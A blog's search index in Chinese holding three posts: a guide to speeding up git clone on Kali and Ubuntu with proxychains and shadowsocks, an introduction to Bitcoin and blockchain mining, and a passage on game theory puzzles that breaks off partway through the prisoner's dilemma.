<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>git clone提速|使用proxychains+代理服务</title>
      <link href="/2020/04/13/fast-git-clone/"/>
      <url>/2020/04/13/fast-git-clone/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从 github上git clone资源，由于地域限制原因，大陆会特别慢，一般就在0-10KB/s的样子，用Xdown跑多线程都救不了。小项目都得等好久，大项目常规方式基本下不了。Windows现在可以使用国内的码云进行转接项目。但是对于linux虚拟机git clone的话，还是使用<strong>proxychain + 代理</strong>比较方便。</p><h2 id="kali-linux篇"><a href="#kali-linux篇" class="headerlink" title="kali linux篇"></a>kali linux篇</h2><blockquote><p>下面内容包括：<br>1.怎么从linux git clone自己的私库（涉及到RSA密码）<br>2.git clone from 太慢，怎么使用proxychains提速<br>3.如何安装linux的shadowsocks（官方教程亲测不行）</p></blockquote><h3 id="1-linux的github-ssh-key配置"><a href="#1-linux的github-ssh-key配置" class="headerlink" title="1.linux的github ssh key配置"></a>1.linux的github ssh key配置</h3><p><strong>（1）设置git 的user name 和email</strong><br>$ git config –global user.name “user_name”<br>$ git config –global user.email “<a href="mailto:xxx@gmail.com">xxx@gmail.com</a>“</p><p><strong>（2）生成密钥过程</strong><br>先查看有没有密钥（我就是弄了两次，第一次没弄好，一定要删除，不能把密钥弄混了）<br>用cd ~/.ssh命令查看是否生成密钥<br>生成密钥：<br>命令行：$ ssh-keygen -t rsa -C “<a href="mailto:xxx@gmail.com">xxx@gmail.com</a>”<br>连续三次回车，密码设置为空。</p><p>会得到两个文件：id_rsa和id_rsa.pub</p><p><strong>（3）github上添加密钥</strong><br>登录github，添加ssh，添加的密钥是id_rsa.pub里面的<br>添加好之后是这样的：<br><img src="https://img-blog.csdnimg.cn/20200412234232889.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="添加密钥成功"><br>如果还不行（我是可以），问题应该出在了git仓库没有和SSH key关联上，<br>命令行输入：ssh-add “你的 id-rsa 文件地址”<br>注意这里ssh-add后面填的是私钥地址<br>如mac电脑是 /Users/用户名/.ssh/id_rsa</p><p><strong>（4）测试：ssh <a href="mailto:git@github.com">git@github.com</a></strong></p><h3 id="2-kali使用proxychains-加速git-clone-from-github"><a href="#2-kali使用proxychains-加速git-clone-from-github" class="headerlink" title="2.kali使用proxychains 加速git clone from github"></a>2.kali使用proxychains 加速git clone from github</h3><p>仓库都搞好了，我应该高高兴兴去git clone了，然而…这速度能急死人，20%之后就特别慢了，国内能搜到的教程基本没用。<br><strong>安装proxychains</strong></p><pre><code>git clone https://github.com/rofl0r/proxychains-ngcd proxychains-ng./configuresudo make &amp;&amp; make installcp src/proxychains.conf /etc/proxychains.conf</code></pre><p><strong>配置proxychains</strong></p><pre><code>vim /etc/proxychains.conf在最后一行加上socks5  127.0.0.1 1080（只要socks5就行）</code></pre><p><img src="https://img-blog.csdnimg.cn/20200412235006812.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="配置完成"></p><h3 id="3-最后重点讲一下怎么在linux安装shadowsocks"><a href="#3-最后重点讲一下怎么在linux安装shadowsocks" class="headerlink" title="3.最后重点讲一下怎么在linux安装shadowsocks"></a>3.最后重点讲一下怎么在linux安装shadowsocks</h3><p><a href="https://www.jichang.uk/posts/shadowsocks-linux.html#%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86" target="_blank" rel="noopener">官网教程</a>（已失效）<br>第2点的proxychains我就是借鉴这个教程的（可用），但是它前面的那个shadowsocks安装方法已经失效了…被这个卡到抓狂。<br><a href="https://github.com/shadowsocks/shadowsocks-libev">有效教程</a><br><strong>（1）安装shadowsocks</strong></p><pre><code>apt install shadowsocks-libevvim /etc/shadowsocks.json</code></pre><p><strong>（2）配置shadowsocks</strong></p><pre><code>把在官网购买好的有效信息填进去即可，具体参考官网教程</code></pre><p><img src="https://img-blog.csdnimg.cn/2020041223525120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="配置信息"><br><strong>（3）启动shadowsocks</strong></p><pre><code>ss-local -c /etc/shadowsocks.json</code></pre><p><img src="https://img-blog.csdnimg.cn/20200412235352377.jpg#pic_center" alt="启动成功"><br><strong>（4）使用proxychains4代理</strong><br>启动完成如上图，新建一个窗口proxychains4即可<br><img src="https://img-blog.csdnimg.cn/20200412235452333.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="使用代理加速下载"></p><hr><h2 id="ubuntu16-04-篇"><a href="#ubuntu16-04-篇" class="headerlink" title="ubuntu16.04 篇"></a>ubuntu16.04 篇</h2><blockquote><p>给kali装了shadowsocks之后，git clone 嗖嗖的。今天配ubuntu16.04，新装的机打pwn用，配置pwndbg的时候git clone下载特别慢就想着给ubuntu也挂个代理。</p></blockquote><h3 id="1-ubuntu和kali的区别"><a href="#1-ubuntu和kali的区别" class="headerlink" title="1.ubuntu和kali的区别"></a>1.ubuntu和kali的区别</h3><p>ubuntu16.04和kali linux的区别在于<strong>ubuntu16.04的PPA中支持shadowsocks-libev的下载</strong><br><a href="https://zhuanlan.zhihu.com/p/55250294" target="_blank" rel="noopener">什么是PPA？</a><br><a href="https://launchpad.net/~max-c-lv/+archive/ubuntu/shadowsocks-libev" target="_blank" rel="noopener">怎么把shadowsocks-libev添加到PPA中</a></p><h3 id="2-添加shadowsocks到PPA并安装"><a href="#2-添加shadowsocks到PPA并安装" class="headerlink" title="2.添加shadowsocks到PPA并安装"></a>2.添加shadowsocks到PPA并安装</h3><p><strong>安装过程</strong></p><pre><code>sudo add-apt-repository ppa:max-c-lv/shadowsocks-libevsudo apt-get updatesudo apt install shadowsocks-libev</code></pre><p><strong>配置shadowsocks</strong></p><pre><code>vim /etc/shadowsocks.json</code></pre><p><img src="https://img-blog.csdnimg.cn/20200413001501379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="配置信息"></p><h3 id="3-下载proxychains"><a href="#3-下载proxychains" class="headerlink" title="3.下载proxychains"></a>3.下载proxychains</h3><p><strong>下载</strong></p><pre><code>apt install proxychains</code></pre><p><strong>配置</strong></p><pre><code>vim /etc/proxychains.conf最后一行加上 socks5 127.0.0.1 1080</code></pre><p><img src="https://img-blog.csdnimg.cn/20200413001643868.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="配置完成"><br><strong>使用proxychains+代理</strong></p><pre><code>ss-local -c /etc/shadowsocks.jsonproxychains git clone https://github.com/pwndbg/pwndbg</code></pre><blockquote><p>使用proxychains+代理，速度一般稳定在几百K/s，对于一般项目来说已经足够。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> git clone提速 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> ubuntu16.04 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链 | 比特币与区块链介绍以及区块链安全</title>
      <link href="/2020/04/12/block-chain/"/>
      <url>/2020/04/12/block-chain/</url>
      
        <content type="html"><![CDATA[<h1 id="第一节"><a href="#第一节" class="headerlink" title="第一节"></a>第一节</h1><blockquote><p>本节内容主要有：什么是比特币、比特币的起源与发展、区块及区块链的定义，矿机挖矿的原理。</p></blockquote><h2 id="什么是比特币"><a href="#什么是比特币" class="headerlink" title="什么是比特币"></a>什么是比特币</h2><p>比特币(BitCoin)是一种P2P形式的虚拟货币。2008年，一个名叫中本聪(Satoshi Nakamoto)的人发明了比特币，他在网络上发表了《比特币:一种点对点的电子现金系统》，即《白皮书》。点对点的传输意味着一个去中心化的电子记账系统的建立。</p><h3 id="去中心化的电子记账系统"><a href="#去中心化的电子记账系统" class="headerlink" title="去中心化的电子记账系统"></a>去中心化的电子记账系统</h3><p>和传统的记账方式不同（传统记账由银行来进行操作，可信度基于国家信用），去中心化则不需要依靠传统银行机构，每个人的账单记录都是公开的。<br><img src="https://img-blog.csdnimg.cn/20200412173201536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="传统记账系统"><br>举例来说，有A,B,C,D四个人进行交易，每次交易内容都会告诉其它三个人。<br><img src="https://img-blog.csdnimg.cn/20200412173320898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="去中心化的记账系统"></p><hr><h2 id="区块-amp-amp-区块链"><a href="#区块-amp-amp-区块链" class="headerlink" title="区块&amp;&amp;区块链"></a>区块&amp;&amp;区块链</h2><p>A,B,C,D四个人的账单信息进行打包，就形成了一个<strong>区块(block)</strong>。一般来说一个区块的大小大约为1M，可以存放4000条左右的记录。<br><img src="https://img-blog.csdnimg.cn/20200412173953708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="区块"><br>一个区块打包完成之后，把它接到前一个区块上，并且之后打包的区块接在目前这个区块之后，这样形成的一条链我们称为<strong>区块链(Block Chain)</strong>。<br><img src="https://img-blog.csdnimg.cn/20200412174527420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="区块链"></p><h3 id="为何我需要记账？"><a href="#为何我需要记账？" class="headerlink" title="为何我需要记账？"></a>为何我需要记账？</h3><blockquote><p>记录和自己的资金不相干的账单，占用了自己的电脑资源，我们为什么要记账？</p></blockquote><p><strong>记账奖励</strong><br>记账是由于记账可以得到奖励。<br><strong>（1）手续费</strong><br>举例来说，A支付10个比特币给B，实际上A支付的要比10个比特币多一点，多出的一点就是给记账人的手续费。（比特币交易的手续费比传统交易的手续费低）<br><strong>（2）打包奖励</strong><br>从比特币系统运行开始，在第一个四年里，每打一次包奖励50个比特币，在第二个四年里，每打一个包奖励25个比特币，在第三个四年里，每打一个包奖励12.5个比特币…依次类推，每过一个四年，打包奖励少一半。</p><h4 id="比特币总量"><a href="#比特币总量" class="headerlink" title="比特币总量"></a>比特币总量</h4><p>中本聪在最初提出比特币时，规定每十分钟打一个包。我们可以计算出比特币总量如下：</p><blockquote><p>50 <em> 6 </em> 24 <em> 365 </em> 4 * (1/2 + 1/4 +1/8 + …(1/2)^n^)=2100万</p></blockquote><h3 id="账单以谁为准？"><a href="#账单以谁为准？" class="headerlink" title="账单以谁为准？"></a>账单以谁为准？</h3><blockquote><p>因为记账奖励丰厚，一群人抢着去进行打包，但由于网络延迟，可能每个人收到账单不同，这种时候该以谁为准？</p></blockquote><h4 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h4><p>每一个参与打包的用户都要去做一个很难的数学题，如果你可以做出这道数学题，就可以去进行打包了。这个数学题难到没有哪一个人可以通过脑子去计算出来，而必须通过一个一个数去尝试，直到你去把这个数尝试出来了，就有机会去获得奖励，这个过程叫做<strong>挖矿</strong>。</p><h3 id="挖矿原理"><a href="#挖矿原理" class="headerlink" title="挖矿原理"></a>挖矿原理</h3><h4 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h4><p><strong>我们可以通过运算，把一串字符串转化成为一个摘要的形式。</strong> 并且正着算容易，反过来算很难（即可以通过字符串得到摘要，但不能通过摘要获得字符串）<br><strong>以SHA256函数举例：</strong></p><pre><code>sha256("abcd") = 1010...(256位二进制数)正算很容易，反算很难。如果给出一串256位的二进制数，求原来的输入，就只能通过一个一个尝试的方式去寻找。</code></pre><h4 id="具体原理"><a href="#具体原理" class="headerlink" title="具体原理"></a>具体原理</h4><p><strong>区块由头部和账单信息组成。</strong><br><img src="https://img-blog.csdnimg.cn/20200412181422148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="区块组成"><br>假设现在有很多人想要去接块，每个人都有一分记录好的账单。<br>在接块的时候必须要算一个数学题：<br><strong>1.字符串：前块的头部+账单信息+时间戳+…+随机数</strong><br><strong>2.Hash=sha256(sha256(字符串))</strong><br><strong>3.计算得到的Hash值需要符合要求</strong></p><blockquote><p>比如说要求前n位为0:即 Hash=000…11011（前n位为0即可满足条件，获得接块的权利）</p></blockquote><p><strong>4.符合要求之后进行打包</strong><br>把计算得到的Hash值作为新块的头部，账单作为新块的信息，即可打包成一个新块从而获得奖励。<br><img src="https://img-blog.csdnimg.cn/20200412182346723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="新块上链"><br><strong>怎么去使得字符串满足要求？</strong><br>我们来看字符串的组成，<strong>字符串：前块的头部+账单信息+时间戳+…+随机数</strong></p><p><strong>我们可以改变的只有随机数，二进制从0开始一直尝试。</strong> 每个人的计算难度是不一样的，但是平均而言，挖到矿的可能性大小与计算能力相关联，谁的计算能力强，谁就有更大的可能去挖到这个矿。</p><h4 id="挖矿难度设置"><a href="#挖矿难度设置" class="headerlink" title="挖矿难度设置"></a>挖矿难度设置</h4><p><strong>挖矿难度由要求Hash值的前n位来设置。</strong><br>前n位为指定数，比如前n个都是0，概率为 (1/2)^n^ 。<br>中本聪当初设置在每十分钟出一个块，如何保证在10分钟内能出一个块呢？则需要调整n的大小即挖矿难度。</p><blockquote><p>例：假设世界上有10^4^台矿机，每台矿机的运算速度为14T/s(即每秒可以进行1.4 <em> 10^13^次哈希运算)<br>10min计算次数：1.4 </em> 10^13^ <em> 10^4^ </em> 600 = 8 * 10^19^ ,大概相当于 2^66^ 。在这种情况下，就会把难度n设置为66。</p></blockquote><hr><h1 id="第二节"><a href="#第二节" class="headerlink" title="第二节"></a>第二节</h1><p>接上一节区块链和比特币的基本介绍，我们知道比特币的所有记录都是公开而且匿名的。这样比特币会面临几个问题：如何去解决伪造记录、篡改记录以及双重支付的问题。</p><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><blockquote><p>在传统认证方式中，通常会使用人脸认证、签名认证、指纹认证等方式，但是在电子支付系统上都不能实现，因为上述方式可以被拷贝之后伪造。</p></blockquote><h3 id="电子签名"><a href="#电子签名" class="headerlink" title="电子签名"></a>电子签名</h3><p>电子签名技术采用了目前广泛使用的非对称加密方式 <img src="https://img-blog.csdnimg.cn/20200412191558459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="电子签名技术"></p><h2 id="如何解决伪造记录"><a href="#如何解决伪造记录" class="headerlink" title="如何解决伪造记录"></a>如何解决伪造记录</h2><p>流程图：<br><img src="https://img-blog.csdnimg.cn/20200412211725241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="防止伪造记录"><br>解决伪造记录的关键在于使用<strong>非对称加密方式</strong></p><p>A给B10个比特币这一事件，通过hash运算得到摘要之后，用私钥对摘要进行加密得到密码。由于私钥的唯一性，摘要具有唯一性。通过广播的方式，A传递出去的消息有：A给B10个比特币，A的公钥，A的密码。<br>我们可以假设，A给B10个比特币的消息是假的，并根据此hash运算得到了摘要1。而利用A的公钥解密密码得到了摘要2，此时摘要1和摘要2不同，显然”A给B10个比特币”是伪造的消息。</p><h2 id="双重支付问题"><a href="#双重支付问题" class="headerlink" title="双重支付问题"></a>双重支付问题</h2><h3 id="余额检查-追溯法"><a href="#余额检查-追溯法" class="headerlink" title="余额检查(追溯法)"></a>余额检查(追溯法)</h3><blockquote><p>每个人在使用区块链比特币的时候，都会下载从第一个区块到目前为止的所有信息。<br>比如A广播了数据”A支付给B10个比特币”，其他人就会进行余额检查，检查A是否有这个支付能力，如果没有这个支付能力，那么其他人就不会去确认A广播的这条信息。当”A支付给B10个比特币”这个信息被打包到一个新的块里面，此时这条信息被确认。<br><img src="https://img-blog.csdnimg.cn/2020041221464217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="消息确认"></p></blockquote><h3 id="双重支付"><a href="#双重支付" class="headerlink" title="双重支付"></a>双重支付</h3><blockquote><p>当双重支付发生时，比如A只有10个比特币，但同时广播了消息”A给B10个比特币”(记为消息b)和”A给C10个比特币”（记为消息c），群体D先接收到消息b，则不会去确认消息c。同理，群体E先接收到消息c，则不会去确认消息b。这时候就要看群体D和E中谁先能计算出那道数学题，先挖出矿的可以把自己确认的消息写到新块中，而另一条消息则失效。<br><img src="https://img-blog.csdnimg.cn/20200412215749444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="如何防止双重支付"></p></blockquote><h2 id="防止篡改问题"><a href="#防止篡改问题" class="headerlink" title="防止篡改问题"></a>防止篡改问题</h2><h3 id="最长链原则"><a href="#最长链原则" class="headerlink" title="最长链原则"></a>最长链原则</h3><blockquote><p>当区块链出现分支的情况下，即有不止一个人在近乎相同时间内挖出了下一个块，链的走向出现了分支，一般而言使用最长链原则进行选择。假设用户群体A选择上链继续挖矿，用户群体B选择下链继续挖矿。如果群体A先挖出下一个矿，上链新块，则群体B转到新块后继续挖矿。通常情况下，下链被废弃。<br><img src="https://img-blog.csdnimg.cn/20200412221257165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="最长链原则"></p></blockquote><h3 id="如何防止篡改"><a href="#如何防止篡改" class="headerlink" title="如何防止篡改"></a>如何防止篡改</h3><blockquote><p>由最长链原则我们可以知道，如果有人想篡改区块链上某一区块的信息，他就要在该区块处引出一条分支，并且打造一条新链使得新链超过原链长度。即他一人控制的矿机算力要超过全世界剩余的矿机算力，显然很难实现。<br><img src="https://img-blog.csdnimg.cn/20200412222625409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="篡改信息"></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Bitcoin </category>
          
          <category> Block Chain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Block Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博弈论 | 三姬分金与囚徒困境</title>
      <link href="/2020/04/11/game/"/>
      <url>/2020/04/11/game/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在刷李永乐老师视频的时候看到了一个“三姬分金”的问题，然后引到了博弈论。说实话，从这个老师的课程中深深的感受到了知识的魅力。就想着写一个专栏，学习一下博弈论的有关知识。</p><p><strong>什么是博弈</strong></p><blockquote><p>通俗地讲， 博弈就是指游戏中的一种选择策略的研究。 博弈的英文为“game”， 我们一般将它翻译成“游戏”。 而在英语中， “game”的意义不同于汉语中的游戏， 它是人们遵循一定规则的活动， 进行活动的人的目的是让自己“赢”。 我们在和对手竞赛或游戏的时候怎样使自己赢呢？ 这不但要考虑自己的策略， 还要考虑其他人的选择。 生活中博弈的案例很多， 只要涉及人群的互动以及选择决策， 就有博弈。<br>一个人做选择时必须考虑其他人的选择或是事务的变化， 而其他人做选择时也会考虑此人的选择。 此人的结果——博弈论称之为支付， 不仅取决于他的行动选择——博弈论称之为策略选择， 同时取决于其他人的策略选择。 这样， 此人和其他人或事务就构成一个博弈。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200411201405346.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="博弈"></p><h2 id="三姬分金问题"><a href="#三姬分金问题" class="headerlink" title="三姬分金问题"></a>三姬分金问题</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><blockquote><p>当年，韩非子到一个大将军处索要军饷，看见大将军的三个妃子在玩分金币的游戏。于是韩非子提议，玩点更刺激的。</p></blockquote><h3 id="游戏规则"><a href="#游戏规则" class="headerlink" title="游戏规则"></a>游戏规则</h3><blockquote><p>现有A、B、C三名美姬，分100枚金币。从A开始，每个人依次提议分配方案。如果提议赞同人数不超过50%，则提议人被处死。反之则提议通过。A、B、C的顺序通过抽签来决定。<br>此外，有两点前提：<br>1.每个人都是聪明的，即她知道每个提议带来的后果，并追求自己利益的最大化。<br>2.每个人都是邪恶的，在她追求自己利益最大化的同时，要尽量多的杀死其余美姬。</p></blockquote><h3 id="思维实验0"><a href="#思维实验0" class="headerlink" title="思维实验0"></a>思维实验0</h3><p>如果游戏按照规则进行，那么结果会是怎样？<br>（1）我们不妨先假设A的提议被B、C否决：<br>美姬A被处死，到美姬B提议，根据规则”赞同人数不超过50%则提议人被处死”，故无论美姬B提议什么，美姬C都不会同意（即使B提议金币全给C也是如此）。美姬B这么聪明当然也考虑到了这个问题。<br>（2）美姬A提议必然通过：<br>由（1）中分析，美姬A的提议必然会被B同意（B不同意就死），所以A可以肆无忌惮的提议分配方案，故A提出了（100,0,0）的分配方案，实现了自己利益最大化。</p><p><strong>在思维实验0中，美姬A具有先手优势。</strong></p><hr><h3 id="思维实验1"><a href="#思维实验1" class="headerlink" title="思维实验1"></a>思维实验1</h3><p>假设在美姬A前面加一个美姬X，其他规则不变，结果会如何？<br>（1）不妨先假设美姬X的提议被否决：<br>美姬X被处死，到美姬A提议，参考思维实验0可知，美姬A还是提出（100,0,0）的提议，且必定被通过。<br>（2）美姬X提出方案对B，C有利则会被通过：<br>美姬X考虑到如果由美姬A提议，则B,C什么都得不到。故美姬X决定拉拢美姬B,C。她提出了（98,0，1,1）的分配方案。美姬A肯定不同意（但是没有用），美姬B,C一看还能得到1枚金币，于是通过了美姬X的提议方案。<br><strong>在思维实验1中，美姬X具有先手优势，即领导群体，美姬B、C属于基层群体，是领导群体拉拢的对象。在有限次的实验中，拿到先手权意味着锁定胜局。而且只要条件规则稳定，结果是一定的，这样的局面叫做纳什均衡</strong></p><hr><h3 id="思维实验2"><a href="#思维实验2" class="headerlink" title="思维实验2"></a>思维实验2</h3><p><strong>共谋</strong></p><blockquote><p>在思维实验1的背景下，美姬A,B,C觉得不公平，还想实现利益最大化。于是A提议：否定美姬X的提议，A,B,C各分33枚金币，剩下一枚丢进海里。这个过程叫做”共谋”。</p></blockquote><p>那么在实验的过程中，如何保证在杀掉美姬X之后，美姬A信守承诺均分金币呢？<br>A,B,C之间需要制定一个契约，规定B,C帮助A杀掉X之后，A能信守承诺均分金币。此外，为了防止A撕毁契约，还需要执行和守护契约的团体，通过分权的方式使其不能串通。执行和守护契约的团体的建立权在B,C手中，即实现了”民主”。</p><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>三姬分金这个故事很好的解释了社会中的一些现象：古代统治者为何需要拉拢底层人民、为何大副都想当船长…</p><blockquote><p>《1984》里面写到：有史以来，大概自从新石器时代结束以来，世上就有三种人，即上等人、中等人、下等人。 这三种人的目标是完全不可调和的。上等人的目标是要保持他们的地位。中等人的目标是要同高等人交换地位。下等人的特点始终是，他们劳苦之余无暇旁顾，偶而才顾到日常生活以外的事，因此他们如果有目标的话，无非是取消一切差别，建立一个人人平等的社会。</p></blockquote><hr><h2 id="囚徒困境问题"><a href="#囚徒困境问题" class="headerlink" title="囚徒困境问题"></a>囚徒困境问题</h2><h3 id="问题简介"><a href="#问题简介" class="headerlink" title="问题简介"></a>问题简介</h3><p><a href="https://wiki.mbalib.com/wiki/%E5%9B%9A%E5%BE%92%E5%9B%B0%E5%A2%83" target="_blank" rel="noopener">囚徒困境</a>是博弈论的<a href="https://wiki.mbalib.com/wiki/%E9%9D%9E%E9%9B%B6%E5%92%8C%E5%8D%9A%E5%BC%88" target="_blank" rel="noopener">非零和博弈</a>中具代表性的例子，反映个人最佳选择并非团体最佳选择。虽然困境本身只属模型性质，但现实中的价格竞争、环境保护等方面，也会频繁出现类似情况。</p><hr><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>1950年，由就职于兰德公司的梅里尔·弗拉德（Merrill Flood）和梅尔文·德雷希尔（Melvin Dresher）拟定出相关困境的理论，后来由顾问阿尔伯特·塔克（Albert Tucker）以囚徒方式阐述，并命名为“囚徒困境”。经典的囚徒困境如下：</p><blockquote><p>警方逮捕甲、乙两名嫌疑犯，但没有足够证据指控二人入罪。于是警方分开囚禁嫌疑犯，分别和二人见面，并向双方提供以下相同的选择：</p></blockquote><blockquote><p>若一人认罪并作证检举对方（相关术语称“背叛”对方），而对方保持沉默，此人将即时获释，沉默者将判监10年。<br><img src="https://img-blog.csdnimg.cn/20200411203310243.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="一方背叛"></p></blockquote><blockquote><p>若二人都保持沉默（相关术语称互相“合作”），则二人同样判监一年。<br><img src="https://img-blog.csdnimg.cn/20200411203250576.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="双方背叛/双方合作"></p></blockquote><blockquote><p>若二人都互相检举（互相“背叛”），则二人同样判监8年。</p></blockquote><p><strong>表格描述</strong></p><table><thead><tr><th>囚徒行为</th><th>甲沉默（合作）</th><th>甲认罪（背叛）</th></tr></thead><tbody><tr><td>乙沉默（合作）</td><td>二人同服刑1年</td><td>甲当即释放，乙服刑10年</td></tr><tr><td>乙认罪（背叛）</td><td>乙当即释放，甲服刑10年</td><td>二人同服刑8年</td></tr></tbody></table><p>如同博弈论的其他例证，囚徒困境假定每个参与者（即“囚徒”）都是利己的，即都寻求最大自身利益，而不关心另一参与者的利益。参与者某一策略所得利益，如果在任何情况下都比其他策略要低的话，此策略称为“严格劣势策略”，理性的参与者绝不会选择。另外，没有任何其他力量干预个人决策，参与者可完全按照自己意愿选择策略。</p><hr><h3 id="思维实验0-1"><a href="#思维实验0-1" class="headerlink" title="思维实验0"></a>思维实验0</h3><p>（1）从个体来看，囚徒的选择如下：</p><ul><li>如果对方选择沉默，背叛可以使我获释</li><li>如果对方选择背叛，背叛可以使我的刑期减少</li></ul><p><strong>即从个体角度出发，背叛无疑是最优选择。</strong> 